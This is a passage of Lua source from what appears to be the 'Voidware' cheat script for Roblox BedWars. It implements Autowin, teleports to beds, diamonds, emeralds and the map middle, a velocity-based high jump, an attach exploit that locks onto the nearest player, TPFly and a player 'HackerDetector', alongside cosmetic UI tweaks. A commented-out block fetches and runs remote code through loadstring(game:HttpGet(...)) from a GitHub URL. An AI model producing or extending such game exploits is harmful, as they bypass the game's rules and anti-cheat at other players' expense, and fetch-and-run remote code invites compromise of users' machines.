				local autoplayertween2
				local AutowinConnection
				local alreadytweened2
				local ModeMetas = {
					["bedwars_duels"] = "Duels",
					["bedwars_ranked_s7"] = "5v5",
					["bedwars_5v5"] = "5v5",
				}
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								...
								if bedwarsStore.queueType == "bedwars_test" then
									repeat task.wait() until bedwarsStore.queueType ~= "bedwars_test"
								end
								if bedwarsStore.queueType:find("skywars") then
									warningNotification("Autowin", "Can't run in Skywars.")
								...
								AutowinEnabled = true
                                if not bedwarsStore.queueType:find("5v5") and not bedwarsStore.queueType:find("ranked") then
									if not Autowin.Enabled then return end
									DestroyCharacter()
								elseif bedwarsStore.queueType:find("ranked") or bedwarsStore.queueType:find("5v5") then
									if FindEnemyBed():GetAttribute("BedShieldEndTime") > workspace:GetServerTimeNow() then
										if not Autowin.Enabled then return end
										warningNotification("Autowin", "Waiting for the bed shields to break.", 20)
									repeat task.wait() until FindEnemyBed():GetAttribute("BedShieldEndTime") < workspace:GetServerTimeNow() or FindEnemyBed():GetAttribute("BedShieldEndTime") < workspace:GetServerTimeNow() or not FindEnemyBed() or not FindTeamBed()
									end
									if FindTeamBed() and entityLibrary.isAlive and Autowin.Enabled then
									DestroyCharacter()
								end
								end
								pcall(function()
								AutowinConnection = lplr.CharacterAdded:Connect(function()
									VoidwareStore.teleportinprogres = true
									repeat task.wait() until lplr.Character:FindFirstChild("HumanoidRootPart") and lplr.Character.PrimaryPart
									if FindEnemyBed() then
									 alreadytweened2 = false
									 bedtweenplayed = false
									for i,v in pairs(workspace:GetChildren()) do
										if v.Name == "bed" then
											if v.Covers.BrickColor ~= lplr.Team.TeamColor then
												task.wait(0.3)
												if not Autowin.Enabled then return end
												autobedtween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.49, Enum.EasingStyle.Linear), {CFrame = CFrame.new(v.Position) + Vector3.new(0, 45, 0)})
								                autobedtween:Play()
												bedtouchconnection = v.Touched:Connect(function()
													bedtouched = true
													bedtouchconnection:Disconnect()
													repeat task.wait() until not entityLibrary.isAlive or not isAlive(lplr) or not Autowin.Enabled
													bedtouched = false
												end)
												bedrespawnlagbackcheck = lplr:GetAttributeChangedSignal("LastTeleported"):Connect(function()
													task.wait(1.30)
													if not bedtouched and bedtweenplayed and isAlive(lplr) then
														bedrespawnlagbackcheck:Disconnect()
														if not Autowin.Enabled then return end
														DestroyCharacter()
													end
												end)
												autobedtween.Completed:Wait()
												bedtweenplayed = true
												VoidwareStore.teleportinprogres = false
												repeat task.wait() until v == nil or v.Parent == nil or not v
												bedrespawnlagbackcheck:Disconnect()
												if Autowin.Enabled and FindTeamBed() then
												if not Autowin.Enabled then return end
												DestroyCharacter()
												end
												break
									...
									for i3,v10 in pairs(playersService:GetPlayers()) do
										if v10.Character and v10.Character:FindFirstChild("HumanoidRootPart") then
											while v10.Team ~= lplr.Team and v10.Character.Humanoid.Health > 0 do task.wait(0.2)
												if bedwarsStore.queueType == "bedwars_duels" then
												autoplayertween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.45, Enum.EasingStyle.Linear), {CFrame = CFrame.new(v10.Character.HumanoidRootPart.CFrame.Position)})
												else
												autoplayertween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.49, Enum.EasingStyle.Linear), {CFrame = CFrame.new(v10.Character.HumanoidRootPart.CFrame.Position)})
												end
												if not alreadytweened then
												autoplayertween:Play()
												end
												autoplayertween.Completed:Wait()
												VoidwareStore.teleportinprogres = false
												alreadytweened = true
												repeat task.wait()
													if not isnetworkowner(entityLibrary.character.HumanoidRootPart) or not isAlive(v10) then if FindTeamBed() and not bedwarsStore.queueType:find("skywars") then if Autowin.Enabled then DestroyCharacter() end end break end
													lplr.Character.HumanoidRootPart.CFrame = v10.Character.HumanoidRootPart.CFrame
												until not Autowin.Enabled or v10.Parent == nil or not v10 or not alreadytweened
											end
										end
									end
								end
							   ...
							   if bedrespawnlagbackcheck then
								bedrespawnlagbackcheck:Disconnect()
							   end
							   AutowinEnabled = false
                        end
                    end,
                    HoverText = "just a stupid autowin I made.",
					ExtraText = function() 
						return ModeMetas[bedwarsStore.queueType] or "Optimized"
					end
				})
			end)
			...
			runFunction(function()
				...
				local magcheck = {Enabled = true}
				local namecheck = {Enabled = true}
				local namecheck2 = {Enabled = true}
				local statecheck = {Enabled = true}
				local toolcheck = {Enabled = true}
				local teamatecheck = {Enabled = true}
				local lastjumpedtick = {}
				local alreadydetected = {}
				local susplayers = {}
				local function LoadDetectionMethod(v3)
					if v3:GetAttribute("Team") == lplr:GetAttribute("Team") and teamatecheck.Enabled then return end
					task.spawn(function()
					pcall(function()
					repeat
						if isAlive(v3) and isAlive(lplr) and GetMagnitudeOf2Objects(lplr.Character.HumanoidRootPart, v3.Character.HumanoidRootPart) >= 9300 and not LassoHooked(v3) and v3.Character.Humanoid.FloorMaterial == Enum.Material.Air and lplr.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
							if magcheck.Enabled then
							if shared.GlobalVoidwareWhitelistStore.ConfigUsers[v3] == nil and alreadydetected[v3] == nil then 
							warningNotification("HackerDetector", v3.DisplayName.." is cheating! | Mag Check A | InfiniteFly", 120)
							alreadydetected[v3] = true
							end
							end
						end
						task.wait(0.1)
					until not isAlive(v3) or not HackerDetector.Enabled
				end)
			end)
				pcall(function()
					table.insert(HackerDetector.Connections, v3.Character.Humanoid.Swimming:Connect(function()
						if shared.GlobalVoidwareWhitelistStore.ConfigUsers[v3] == nil and alreadydetected[v3] == nil and statecheck.Enabled then 
							warningNotification("HackerDetector", v3.DisplayName.." is cheating! | State Check A | Swimming", 120)
							alreadydetected[v3] = true
							end
					end))
					local SussyNameTable = {"7GrandDadPGN", "7GrandDadPG", "xylex", "Config", "config", "Byfron", "client"}
					for i,v in pairs(SussyNameTable) do
						if v3.DisplayName:find(v) or v3.Name:find(v) then
							if shared.GlobalVoidwareWhitelistStore.ConfigUsers[v3] == nil and alreadydetected[v3] == nil and susplayers[v3] == nil and namecheck.Enabled then 
								warningNotification("HackerDetector", v3.DisplayName.." might be cheating.. | Name Check A | ("..v..")", 30)
								susplayers[v3] = true
								break
								end
						end
				...
				table.insert(HackerDetector.Connections, bedwars.NetManager.BreakBlockEvent.OnClientEvent:Connect(function(app)
						if app.player then
							if app.player == lplr then return end
							if teamatecheck.Enabled then if app.player:GetAttribute("Team") == lplr:GetAttribute("Team") then return end end
							for i2,v2 in pairs(app.player.Character:GetChildren()) do
								local badtooltouse = v2:isA("Accessory") and v2:GetAttribute("InvItem") and not v2.Name:find("axe") and not v2.Name:find("pickaxe") and not v2.Name:find("shears")
								if badtooltouse then
									task.wait(0.2)
									if badtooltouse then
										if shared.GlobalVoidwareWhitelistStore.ConfigUsers[app.player] == nil and alreadydetected[app.player] == nil and toolcheck.Enabled then 
											warningNotification("HackerDetector", app.player.DisplayName.." is cheating! | Tool Check A | Nuker", 120)
											alreadydetected[app.player] = true
											end
									end
							end
						end
                    ...
                    Function = function(callback)
                            if callback then
									...
									for i,v in pairs(playersService:GetPlayers()) do
										...
										repeat task.wait() until isAlive(v) or v.Team.Name == "Spectators"
										end
										if not isAlive(lplr) then
											repeat task.wait() until isAlive(lplr)
										end
										if not isPlayerLoaded(v) then repeat task.wait() until isPlayerLoaded(v) end
										if not isPlayerLoaded(lplr) then repeat task.wait() until isPlayerLoaded(lplr) end
										if v:GetAttribute("Team") == lplr:GetAttribute("Team") and teamatecheck.Enabled then return end
										if v ~= lplr then
											LoadDetectionMethod(v)
										end
									end)
										table.insert(HackerDetector.Connections, v.CharacterAdded:Connect(function()
												if v ~= lplr then
												if v:GetAttribute("Team") == lplr:GetAttribute("Team") and teamatecheck.Enabled then return end	
											      LoadDetectionMethod(v)
												end
									...
									task.spawn(function()
									if bedwarsStore.matchState == 0 then
										repeat task.wait() until bedwarsStore.matchState ~= 0 or not HackerDetector.Enabled
										if HackerDetector.Enabled then
										HackerDetector.ToggleButton(false)
										HackerDetector.ToggleButton(true)
										end
									end
								end)
								else
									if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] > 2 then
										table.clear(alreadydetected)
									end
							end
                    end,
				...
				magcheck = HackerDetector.CreateToggle({
					Name = "InfiniteFly",
					HoverText = "Magnitude check A",
					Function = function() end,
					Default = true
			    })
				statecheck = HackerDetector.CreateToggle({
					Name = "Swim",
					HoverText = "State check A\n(who tf uses this lmao)",
					Function = function() end,
					Default = true
			    })
				toolcheck = HackerDetector.CreateToggle({
					Name = "Nuker",
					HoverText = "Tool check A",
					Function = function() end,
					Default = true
			    })
				namecheck = HackerDetector.CreateToggle({
					Name = "Name",
					HoverText = "Sussy name check A",
					Function = function() end,
					Default = true
			    })
			end)
			...
			runFunction(function()
				local oldgravityvalue = workspace.Gravity
				local chill = false
				local riskjumpheight1 = {Value = 480}
				local riskjumpheight2 = {Value = 230}
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								...
								if not isnetworkowner(lplr.Character.HumanoidRootPart) or not entityLibrary.isAlive then
									warningNotification("DoubleHighJump","Unable to connect with the Humanoid.",6)
									return
								end
								if chill then
									warningNotification("DoubleHighJump","Please wait 1.5 seconds before toggling this feature.",5)
									return
								end
								if entityLibrary.character.Humanoid.FloorMaterial == Enum.Material.Air then return end
                                entityLibrary.character.HumanoidRootPart.Velocity = entityLibrary.character.HumanoidRootPart.Velocity + Vector3.new(0, riskjumpheight1.Value, 0)
								task.wait(1)
								if entityLibrary.character.Humanoid.FloorMaterial == Enum.Material.Air then
								entityLibrary.character.HumanoidRootPart.Velocity = entityLibrary.character.HumanoidRootPart.Velocity + Vector3.new(0, riskjumpheight2.Value, 0)
								else
									warningNotification("DoubleHighJump","Jump 2 failed. you are currently on ground.")
							end
								task.wait(1.5)
								chill = true
							     task.wait(1.5)
							...
							InfoNotification("DoubleHighJump","Feature retogglable in 1.5 seconds.",6)
                        end
                    end,
                    HoverText = "risky high jump."
                })
				riskjumpheight1 = riskjump.CreateSlider({
					Name = "Jump 1 Height",
					Function = function() end,
					Min = 50,
					Max = 550,
				...
				riskjumpheight2 = riskjump.CreateSlider({
					Name = "Jump 2 Height",
					Function = function() end,
					Min = 50,
					Max = 550,
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
                                ...
                                Connection2 = inputService.InputEnded:Connect(function(input)
                                    if input.KeyCode == Enum.KeyCode.Space then
                                        flyup = false
                                    end
                                    if input.KeyCode == Enum.KeyCode.LeftShift then
			...
			runFunction(function()
				local middlechairconnection = false
				local middletpconnection
				local middletptween
				local middletprespawnflag = false
					...
					Function = function(callback)
						if callback then
							task.spawn(function()
								pcall(function()
							  if bedwarsStore.queueType:find("skywars") then
								  warningNotification("MiddleTP","Can't toggle in Skywars.")
								  MiddleTP.ToggleButton(false)
								  return
							   end
							  if not FindEnemyBed() then
								  warningNotification("MiddleTP","Enemy Beds not Found.")
								  MiddleTP.ToggleButton(false)
								  return
							  end
							  if not FindTeamBed() then
								  warningNotification("MiddleTP","Can't reset without a bed.")
								  MiddleTP.ToggleButton(false)
								  return
							  end
							  if VoidwareStore.teleportinprogress then
								  warningNotification("MiddleTP","Another teleport is currently in progress.")
								  MiddleTP.ToggleButton(false)
								  return
							   end
							  local middlepos = workspace:FindFirstChild("RespawnView")
							  if not middlepos then
								warningNotification("MiddleTP", "Middle not found.")
								MiddleTP.ToggleButton(false)
								return
							  end
							  if GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.Enabled then
								GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(false)
								middlechairconnection = true
							  end
							  if entityLibrary.isAlive and FindTeamBed() then
								  lplr.Character.Humanoid.Health = 0
							  end
								VoidwareStore.teleportinprogres = true
								middletpconnection = lplr.CharacterAdded:Connect(function()
								  middletprespawnflag = true
								  task.wait(0.20)
								  middletptween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.49, Enum.EasingStyle.Linear), {CFrame = CFrame.new(middlepos.Position) - Vector3.new(0, 30, 0)})
								  middletptween:Play()
								  middletptween.Completed:Wait()
								  if middlechairconnection then
									GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(true)
									middlechairconnection = false
								  end
								  middletprespawnflag = false
								  VoidwareStore.teleportinprogress = false
								  InfoNotification("MiddleTP","Finished")
								  MiddleTP.ToggleButton(false)
								end)
							end)
							end)
						  else
							  if middletprespawnflag then
								middletprespawnflag = false
								  VoidwareStore.teleportinprogress = false
							  end
							  if middletpconnection then
								middletpconnection:Disconnect()
							  end
							  if middlechairconnection then
								GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(true)
								middlechairconnection = false
							  end
							  if middletptween then
								middletptween:Cancel()
								middletptween:Destroy()
							  end
						end
					end,
			...
			runFunction(function()
				local bedtpmode
				local bedtpchairconnection = false
				local bedtpconnection = false
				local bedtween
				local bedtprespawnflag = false
				local BedTP = {Enabled = false}
				local bedtpmode = {Value = "Optimized"}
				BedTP = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
					...
					Function = function(callback)
						if callback then
							task.spawn(function()
							  if bedwarsStore.queueType:find("skywars") then
								  warningNotification("BedTP","Can't toggle in Skywars")
								  BedTP.ToggleButton(false)
								  return
							   end
							  if not FindEnemyBed() then
								  warningNotification("BedTP","Enemy Beds not Found")
								  BedTP.ToggleButton(false)
								  return
							  end
							  if not FindTeamBed() then
								  warningNotification("BedTP","Team Bed missing")
								  BedTP.ToggleButton(false)
								  return
							  end
							  if VoidwareStore.teleportinprogress then
								  warningNotification("BedTP","Another teleport is currently in progress.")
								  BedTP.ToggleButton(false)
								  return
							   end
							  if entityLibrary.isAlive and FindTeamBed() then
							  ...
							  if GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.Enabled then
								GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(false)
								bedtpchairconnection = true
							  end
								VoidwareStore.teleportinprogres = true
								bedtpconnection = lplr.CharacterAdded:Connect(function()
								  bedtprespawnflag = true
								  task.wait(0.23)
								  if not FindEnemyBed() then
									BedTP.ToggleButton(false)
									return
								  end
								  if bedtpmode.Value == "Smooth" then
								  bedtween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.51, Enum.EasingStyle.Quad), {CFrame = CFrame.new(FindEnemyBed().Position) + Vector3.new(0, 5, 0)})
								  else
								  bedtween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.49, Enum.EasingStyle.Linear), {CFrame = CFrame.new(FindEnemyBed().Position) + Vector3.new(0, 35, 0)})
								  end
								  bedtween:Play()
								  bedtween.Completed:Wait()
								  if bedtpchairconnection and BedTP.Enabled then
									GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(true)
									bedtpchairconnection = false
								  end
								  bedtprespawnflag = false
								  VoidwareStore.teleportinprogress = false
								  bedtpchairconnection = false
								  InfoNotification("BedTP","Finished")
							  ...
							  if bedtprespawnflag then
								  bedtprespawnflag = false
								  VoidwareStore.teleportinprogress = false
							  end
							  if bedtpchairconnection then
								GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(true)
								bedtpchairconnection = false
							  end
							  if bedtpchairconnection then
					...
					ExtraText = function() 
						if GuiLibrary.ObjectsThatCanBeSaved["Text GUIAlternate TextToggle"]["Api"].Enabled then 
							return alternatelist[table.find(bedtpmode["List"], bedtpmode.Value)]
						end
						return bedtpmode.Value 
					end
				})
				bedtpmode = BedTP.CreateDropdown({
					Name = "Tween Mode",
					List = {"Optimized", "Smooth"},
					Function = function() end
				})
			  end)
    
                runFunction(function()
					local diamondchairconnection = false
					local diamondtpconnection
					local diamondtween
					local diamondtprespawnflag = false
					...
					DiamondTP = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
						...
						Function = function(callback)
							if callback then
								task.spawn(function()
									if bedwarsStore.queueType:find("skywars") then
										warningNotification("DiamondTP","Can't toggle in Skywars.")
										DiamondTP.ToggleButton(false)
										return
									 end
								 if not FindItemDrop("diamond") then
									  warningNotification("DiamondTP","Diamond drop not found.")
									  DiamondTP.ToggleButton(false)
									  return
								 end
								  if not FindTeamBed() then
									  warningNotification("DiamondTP","Can't reset without a bed.")
									  DiamondTP.ToggleButton(false)
									  return
								  end
								  if VoidwareStore.teleportinprogress then
									warningNotification("DiamondTP","Another teleport is currently in progress.")
									DiamondTP.ToggleButton(false)
									return
								 end
								if entityLibrary.isAlive and FindTeamBed() then
								...
								if GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.Enabled then
									GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(false)
									diamondchairconnection = true
								  end
								  diamondtprespawnflag = true
								VoidwareStore.teleportinprogress = true
									diamondtpconnection = lplr.CharacterAdded:Connect(function()
									  task.wait(0.30)
									  diamondtween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.45, Enum.EasingStyle.Quad), {CFrame = CFrame.new(FindItemDrop("diamond").Position) + Vector3.new(0, 20, 0)})
									  diamondtween:Play()
									  diamondtween.Completed:Wait()
									  if diamondchairconnection then
										GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(true)
										diamondchairconnection = false
									  end
									  diamondtprespawnflag = false
									  VoidwareStore.teleportinprogress = false
									  InfoNotification("DiamondTP","Finished")
									  DiamondTP.ToggleButton(false)
									end)
								end)
							  else
								if diamondtprespawnflag then
									VoidwareStore.teleportinprogress = false
									diamondtprespawnflag = false
								end
								if diamondchairconnection then
								...
								if diamondtpconnection then
								  diamondtpconnection:Disconnect()
								end
								  if diamondtween then
								  diamondtween:Cancel()
								  diamondtween:Destroy()
								  end
							end
						end,
				  ...
				  runFunction(function()
					local emeraldchairconnection = false
					local emeraldtpconnection
					local emeraldtween
					local emeraldtprespawnflag = false
					...
					EmeraldTP = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
						...
						Function = function(callback)
							if callback then
								task.spawn(function()
								 if bedwarsStore.queueType:find("skywars") then
									warningNotification("EmeraldTP","Can't toggle in Skywars.")
									EmeraldTP.ToggleButton(false)
									return
								 end
								 if VoidwareStore.teleportinprogress then
									warningNotification("EmeraldTP","Another teleport is currently in progress.")
									EmeraldTP.ToggleButton(false)
									return
								 end
								 if not FindItemDrop("emerald") then
									  warningNotification("EmeraldTP","Emerald drop not found.")
									  EmeraldTP.ToggleButton(false)
									  return
								 end
								  if not FindTeamBed() then
									  warningNotification("EmeraldTP","Can't reset without a bed.")
									  EmeraldTP.ToggleButton(false)
									  return
								  end
								  if GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.Enabled then
									GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(false)
									emeraldchairconnection = true
								  end
								if entityLibrary.isAlive and FindTeamBed() then
									lplr.Character.Humanoid.Health = 0
								end
									emeraldtpconnection = lplr.CharacterAdded:Connect(function()
									  emeraldtprespawnflag = true
									  task.wait(0.30)
									  emeraldtween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.45, Enum.EasingStyle.Quad), {CFrame = CFrame.new(FindItemDrop("emerald").Position) + Vector3.new(0, 20, 0)})
									  emeraldtween:Play()
									  emeraldtween.Completed:Wait()
									  if emeraldchairconnection then
										emeraldchairconnection = false
										GuiLibrary.ObjectsThatCanBeSaved.GamingChairOptionsButton.Api.ToggleButton(true)
									end
									  emeraldtprespawnflag = false
									  VoidwareStore.teleportinprogres = false
									  InfoNotification("EmeraldTP","Finished")
									  EmeraldTP.ToggleButton(false)
									end)
								end)
							  else
								if emeraldtprespawnflag then
									VoidwareStore.teleportinprogress = false
									emeraldtprespawnflag = false
								end
								if emeraldchairconnection then
								  ...
								  emeraldtpconnection:Disconnect()
								  emeraldtween:Destroy()
							end
						end,
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
                                ...
                                bedwars.NetManager["CustomMatches:JoinByCode"]:FireServer(table.unpack({
                                    [1] = game:GetService("HttpService"):GenerateGUID(true),
                                    [2] = {
                                        [1] = customcode.Value,
                                    },
                ...
                automid = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								pcall(function()
                                local MiddleRoot = workspace:WaitForChild("RespawnView")
                                if bedwarsStore.matchState == 0 then
									local speedconfig = CustomMapConfiguration.Speed[VoidwareStore.map] ~= nil and CustomMapConfiguration.Speed[VoidwareStore.map] or 0.25
									local YConfig = CustomMapConfiguration.Y[VoidwareStore.map] ~= nil and CustomMapConfiguration.Y[VoidwareStore.map] or 85
                                    repeat task.wait() until bedwarsStore.matchState ~= 0
                                    for i = 1,23 do
                                        task.wait()
                                        if automid.Enabled and bedwarsStore.queueType:find("skywars") then
											middletween = tweenService:Create(entityLibrary.character.HumanoidRootPart, TweenInfo.new(speedconfig, Enum.EasingStyle.Linear), {CFrame = CFrame.new(MiddleRoot.Position.X, MiddleRoot.Position.Y - YConfig, MiddleRoot.Position.Z)})
											middletween:Play()
											end
                                        end
                                    end
                    ...
                    HoverText = "Automatically teleports you to the middle in skywars.\nonly works in the beggining of the game."
                })
			end)
			...
			runFunction(function()
                ...
                vmc = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
                                ...
                                VMConnection = gameCamera.Viewmodel.ChildAdded:Connect(function(v)
                                    if v:FindFirstChild("Handle") then
                                        pcall(function()
											VMHandle = v:FindFirstChild("Handle")
											vmoldtexture = VMHandle.TextureID
											VMHandle.TextureID = ""
											VMHandle.Color = Color3.fromHSV(ViewModelColor.Hue, ViewModelColor.Sat, ViewModelColor.Value)
											VMHandle.Material = Enum.Material.SmoothPlastic
										    pcall(function() VMHandle:FindFirstChild("Neon").Color = Color3.fromHSV(ViewModelColor.Hue, ViewModelColor.Sat, ViewModelColor.Value) oldneons[VMHandle.Neon] = VMHandle:FindFirstChild("Neon").Color end)
											pcall(function() VMHandle:FindFirstChild("Neon").Material = Enum.Material.SmoothPlastic end)
                                        end)
									end
									end)
									if gameCamera.Viewmodel:FindFirstChildWhichIsA("Accessory"):FindFirstChild("Handle") then
										VMHandle = gameCamera.Viewmodel:FindFirstChildWhichIsA("Accessory"):FindFirstChild("Handle")
										vmoldtexture = VMHandle.TextureID
										VMHandle.TextureID = ""
										VMHandle.Color = Color3.fromHSV(ViewModelColor.Hue, ViewModelColor.Sat, ViewModelColor.Value)
										VMHandle.Material = Enum.Material.SmoothPlastic
							...
							if vmoldtexture and VMHandle then
							VMHandle.TextureID = vmoldtexture
							end
							if VMConnection then
                            VMConnection:Disconnect()
							end
							pcall(function() VMHandle:FindFirstChild("Neon").Color = Color3.FromHSV end)
                        end
                    end,
                ...
                ViewModelColor = vmc.CreateColorSlider({
                    Name = "Color",
                    Function = function(h, s, v) if VMHandle and vmc.Enabled then
					 VMHandle.Color = Color3.fromHSV(h, s, v)
					 pcall(function() VMHandle:FindFirstChild("Neon").Color = Color3.fromHSV(h, s, v) end)
					 pcall(function() VMHandle:FindFirstChild("Neon").Material = Enum.Material.SmoothPlastic end)
					 end
					end
                })
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								...
								if not GetClosestTarget(MaxAttachRange.Value) then attachexploit.ToggleButton(false) return end
								repeat task.wait()
									if not GetClosestTarget(MaxAttachRange.Value) or not isnetworkowner(entityLibrary.character.HumanoidRootPart) then attachexploit.ToggleButton(false) return end
								    lplr.Character.HumanoidRootPart.CFrame = GetClosestTarget(MaxAttachRange.Value).Character.HumanoidRootPart.CFrame
									if not GetClosestTarget(MaxAttachRange.Value) or not isAlive(GetClosestTarget(MaxAttachRange.Value)) then attachexploit.ToggleButton(false) end
			...
			runFunction(function()
				...
				local hprounding = {Value = true}
				local hotbar
				local hpbarchangedconnection
				local hpuicorner
				local hpuicorner2
				local hpbarcolor
				local updatehpbar = function()
					pcall(function() getHealthbar("1").BackgroundColor3 = Color3.fromHSV(hpbarcolor.Hue, hpbarcolor.Sat, hpbarcolor.Value) end)
					pcall(function() getHealthbar("1"):GetPropertyChangedSignal("BackgroundColor3"):Connect(function() if hpbar.Enabled then getHealthbar("1").BackgroundColor3 = Color3.fromHSV(hpbarcolor.Hue, hpbarcolor.Sat, hpbarcolor.Value) end end) end)
					if hprounding.Enabled then
						pcall(function()
						...
						hpuicorner2.Parent = lplr.PlayerGui["hotbar"]["1"]["HotbarHealthbarContainer"]
                ...
                hpbar = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
                    ...
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								updatehpbar()
								hpbarchangedconnection = lplr.PlayerGui.ChildAdded:Connect(function()
									if getHealthbar("1") ~= nil then
										updatehpbar()
									end
								end)
                            end)
						else
							pcall(function() hpuicorner:Destroy() hpuicorner2:Destroy() end)
							if hpbarchangedconnection then
								hpbarchangedconnection:Disconnect()
							end
							if hpbarchangedconnection then
								hpbarchangedconnection:Disconnect()
							end
				...
				hpbarcolor = hpbar.CreateColorSlider({
					...
					Function = function(h, s, v)
						if hpbar.Enabled then
							getHealthbar("1").BackgroundColor3 = Color3.fromHSV(h, s, v)
						end
					end
				})
			...
			runFunction(function()
				local roundingradius
				local invcorners = {}
				local invpath
				local HotbarRounding = {Enabled = false}
				HotbarRounding = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
					Name = "InventoryRounding",
					Function = function(callback)
						if callback then
							task.spawn(function()
								pcall(function()
									table.insert(HotbarRounding.Connections, lplr.CharacterAdded:Connect(function()
									invpath = lplr.PlayerGui:WaitForChild("hotbar"):WaitForChild("1"):WaitForChild("4")
									for i,v in pairs(invpath:GetChildren()) do
										if v:IsA("Frame") then
										  local UIRounding = Instance.new("UICorner")
										  UIRounding.Parent = v:FindFirstChildWhichIsA("ImageButton")
										  UIRounding.CornerRadius = UDim.new(0, roundingradius.Value)
										  table.insert(invcorners, UIRounding)
										 end
									end
								end))
							invpath = lplr.PlayerGui:WaitForChild("hotbar"):WaitForChild("1"):WaitForChild("4")
							...
							for i,v in pairs(invpath:GetChildren()) do
                                if v:IsA("Frame") then
                                  if v:FindFirstChildWhichIsA("ImageButton") then
									v:FindFirstChildWhichIsA("ImageButton"):FindFirstChildWhichIsA("UICorner"):Destroy()
									table.clear(invcorners)
								  end
                                 end
								end
                            end
					...
					HoverText = "Rounds up your hotbar."
				})
				roundingradius = HotbarRounding.CreateSlider({
					Name = "Corner Radius",
					Function = function(val) if HotbarRounding.Enabled then for i,v in pairs(invcorners) do pcall(function() v.CornerRadius = UDim.new(0, val) end) end end end,
					Min = 8,
					Max = 20
				})
			end)
			...
			runFunction(function()
				...
				SetEmote = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
					...
					Function = function(callback)
						if callback then
							task.spawn(function()
								oldemote = bedwars.ClientStoreHandler:getState().Locker.selectedSpray
								repeat task.wait() until isAlive(lplr) and bedwarsStore.matchState ~= 0 or not SetEmote.Enabled
								if SetEmote.Enabled then
									oldemote = bedwars.ClientStoreHandler:getState().Locker.selectedSpray
									bedwars.ClientStoreHandler:getState().Locker.selectedSpray = SetEmoteName2[SetEmoteList.Value]
								end
				...
				SetEmoteList = SetEmote.CreateDropdown({
					...
					runFunction(function()
					 if VoidwarePriority[VoidwareWhitelistStore.Rank:upper()] > 1 then
					local banscreentoggled
					local banscreen = {Enabled = false}
                    banscreen = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
                    Name = "MinecraftKickScreen",
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								if banscreentoggled then
									banscreen.ToggleButton(false)
									return
								end
								banscreentoggled = true
								loadstring(VoidwareStore.GetFile("data/banscreen.lua"))()
							end)
							else
								warningNotification("MinecraftBanScreen","Disabled on Rejoin.")
                        end
                    end,
                    HoverText = "pasted from Roblox Thot, its just really cool."
                })
			end
			end)
			...
			--[[runFunction(function()
                    ...
                    antilag = GuiLibrary.ObjectsThatCanBeSaved.UtilityWindow.Api.CreateOptionsButton({
                    Name = "AntiChatCrash",
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
								getgenv().antichatlag = true
								if antilagloaded then
									return
								end
								loadstring(game:HttpGet("https://raw.githubusercontent.com/SystemXVoid/SkiddedScripts4Roblox/main/antichatlag.lua", true))()
								antichatlagloaded = true
							end)
							else
								getgenv().antichatlag = false
                        end
                    end,
                    HoverText = "stops chat crashers from lagging you."
                })
			end)--]]
					...
					if callback then
						task.spawn(function()
							...
							repeat
							 ...
							 if not isnetworkowner(entityLibrary.character.HumanoidRootPart) or not isAlive(lplr) or GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled then TPFly.ToggleButton(false) return end
							 lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, TPFlyVerticalHeight.Value, 0)
							 entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(0, -2, 0)
					        task.wait(0.1)
		...
		runFunction(function()
			local GroundTP = {Enabled = false}
			local GroundTPVertical = {Value = 100}
			GroundTP = GuiLibrary.ObjectsThatCanBeSaved.WorldWindow.Api.CreateOptionsButton({
			Name = "GroundTP",
			HoverText = "teleports your character back to the ground.\nuseful for InfiniteFly issues.",
